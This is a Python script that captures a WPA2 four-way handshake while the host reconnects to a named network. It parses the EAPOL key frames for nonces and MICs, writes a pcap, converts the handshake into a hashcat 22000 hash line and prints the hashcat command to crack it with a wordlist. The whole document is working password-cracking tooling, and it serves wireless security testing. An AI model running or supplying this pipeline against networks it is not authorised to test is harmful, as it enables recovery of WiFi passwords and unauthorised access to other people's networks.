#!/usr/bin/env python3
"""
Capture complete WPA2 handshake from managed mode reconnection.
Saves pcap and extracts handshake data for cracking.
"""
import socket, struct, time, subprocess, sys, os

TARGET_SSID = "9899a5b77"
PCAP_FILE = "/tmp/hs_wpa2.pcap"

# Ethernet linktype pcap
PCAP_HDR = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

def run(cmd, timeout=15):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None

def parse_key_info(ki):
    """Parse WPA2 Key Info field"""
    return {
        'version': ki & 0x7,
        'pairwise': (ki >> 3) & 1,
        'install': (ki >> 6) & 1,
        'ack': (ki >> 7) & 1,
        'mic': (ki >> 8) & 1,
        'secure': (ki >> 9) & 1,
        'error': (ki >> 10) & 1,
        'request': (ki >> 11) & 1,
        'encrypted': (ki >> 12) & 1,
    }

def get_msg_num(ki_parsed):
    if ki_parsed['ack'] and not ki_parsed['mic']:
        return 1
    elif not ki_parsed['ack'] and ki_parsed['mic'] and not ki_parsed['secure']:
        return 2
    elif ki_parsed['ack'] and ki_parsed['mic'] and ki_parsed['install']:
        return 3
    elif not ki_parsed['ack'] and ki_parsed['mic'] and ki_parsed['secure']:
        return 4
    return 0

def main():
    print("=== WPA2 Handshake Capture ===")

    # Disconnect
    print("[1] Disconnecting from WiFi...")
    run("nmcli connection modify '{}' connection.autoconnect no".format(TARGET_SSID))
    run("nmcli device disconnect wlan0")
    time.sleep(2)

    # Open socket
    print("[2] Opening capture socket...")
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind(("wlan0", 0))
    sock.settimeout(0.5)

    pcap = open(PCAP_FILE, 'wb')
    pcap.write(PCAP_HDR)

    # Fork: child connects, parent captures
    print("[3] Forking capture + connect...")
    pid = os.fork()
    if pid == 0:
        time.sleep(2)
        r = run("nmcli connection up '{}'".format(TARGET_SSID), timeout=30)
        if r:
            print(f"  nmcli: {r.stdout.strip()}")
        os._exit(0)

    # Parent captures
    print("[4] Capturing (30s)...")
    eapol_frames = []
    total = 0
    start = time.time()

    while time.time() - start < 30:
        try:
            data = sock.recv(65535)
        except socket.timeout:
            continue

        total += 1
        ts = time.time()

        # Write to pcap
        sec = int(ts)
        usec = int((ts - sec) * 1e6)
        pcap.write(struct.pack('<IIII', sec, usec, len(data), len(data)))
        pcap.write(data)

        # Check EAPOL
        if len(data) >= 14:
            et = struct.unpack('!H', data[12:14])[0]
            if et == 0x888e and len(data) > 21:
                dst = data[0:6]
                src = data[6:12]
                eapol_body = data[14:]
                eapol_ver = eapol_body[0]
                eapol_type = eapol_body[1]
                eapol_len = struct.unpack('!H', eapol_body[2:4])[0]

                frame_info = {
                    'ts': ts,
                    'dst': dst.hex(':'),
                    'src': src.hex(':'),
                    'raw': data,
                    'eapol_raw': eapol_body[:4+eapol_len],
                }

                if eapol_type == 3 and len(eapol_body) >= 4 + 95:
                    key_body = eapol_body[4:]
                    key_info = struct.unpack('!H', key_body[1:3])[0]
                    ki = parse_key_info(key_info)
                    msg_num = get_msg_num(ki)

                    nonce = key_body[13:45]
                    key_mic = key_body[77:93]
                    key_data_len = struct.unpack('!H', key_body[93:95])[0]
                    key_data = key_body[95:95+key_data_len] if len(key_body) >= 95+key_data_len else b''

                    frame_info.update({
                        'msg_num': msg_num,
                        'key_info': key_info,
                        'nonce': nonce.hex(),
                        'key_mic': key_mic.hex(),
                        'key_data_len': key_data_len,
                        'key_data': key_data.hex(),
                        'replay_counter': key_body[5:13].hex(),
                    })

                    elapsed = ts - start
                    print(f"  EAPOL M{msg_num}: {frame_info['src']} -> {frame_info['dst']} KI=0x{key_info:04x} (+{elapsed:.1f}s)")

                eapol_frames.append(frame_info)

                if len(eapol_frames) >= 4:
                    time.sleep(0.5)
                    break

    os.waitpid(pid, 0)
    sock.close()
    pcap.close()

    print(f"\nTotal: {total} pkts, {len(eapol_frames)} EAPOL")
    print(f"PCAP: {PCAP_FILE}")

    if len(eapol_frames) >= 2:
        print("\n=== Handshake Details ===")

        m1 = next((f for f in eapol_frames if f.get('msg_num') == 1), None)
        m2 = next((f for f in eapol_frames if f.get('msg_num') == 2), None)
        m3 = next((f for f in eapol_frames if f.get('msg_num') == 3), None)
        m4 = next((f for f in eapol_frames if f.get('msg_num') == 4), None)

        if m1:
            print(f"  M1 ANonce: {m1['nonce']}")
            ap_mac = m1['src']
            sta_mac = m1['dst']
        if m2:
            print(f"  M2 SNonce: {m2['nonce']}")
            print(f"  M2 MIC:    {m2['key_mic']}")
            if not m1:
                ap_mac = m2['dst']
                sta_mac = m2['src']
        if m3:
            print(f"  M3 MIC:    {m3['key_mic']}")
        if m4:
            print(f"  M4 MIC:    {m4['key_mic']}")

        if m1 and m2:
            print(f"\n  AP MAC:  {ap_mac}")
            print(f"  STA MAC: {sta_mac}")
            print(f"  SSID:    {TARGET_SSID}")

            # Generate hashcat 22000 format
            # WPA*02*MIC*AP_MAC*STA_MAC*ESSID_hex*ANonce*EAPOL_M2_hex
            ap_hex = ap_mac.replace(':', '')
            sta_hex = sta_mac.replace(':', '')
            ssid_hex = TARGET_SSID.encode().hex()
            anonce = m1['nonce']
            mic = m2['key_mic']

            # Build the full EAPOL frame for M2 (needed by hashcat)
            # The EAPOL frame in hashcat format is the entire 802.1X frame with MIC zeroed
            eapol_m2 = m2['eapol_raw']
            # Zero out the MIC (bytes 81-97 of EAPOL body, or offset 77+4=81 from eapol start)
            eapol_m2_zeroed = bytearray(eapol_m2)
            eapol_m2_zeroed[4+77:4+93] = b'\x00' * 16
            eapol_hex = eapol_m2_zeroed.hex()

            hash_line = f"WPA*02*{mic}*{ap_hex}*{sta_hex}*{ssid_hex}*{anonce}*{eapol_hex}"

            print(f"\n=== Hashcat 22000 Format ===")
            print(hash_line)

            with open("/tmp/hs_wpa2.22000", 'w') as f:
                f.write(hash_line + '\n')
            print(f"Saved to: /tmp/hs_wpa2.22000")
            print(f"\nTo crack: hashcat -m 22000 /tmp/hs_wpa2.22000 wordlist.txt")

    # Re-enable autoconnect
    run("nmcli connection modify '{}' connection.autoconnect yes".format(TARGET_SSID))

    return 0 if len(eapol_frames) >= 2 else 1

if __name__ == "__main__":
    sys.exit(main())
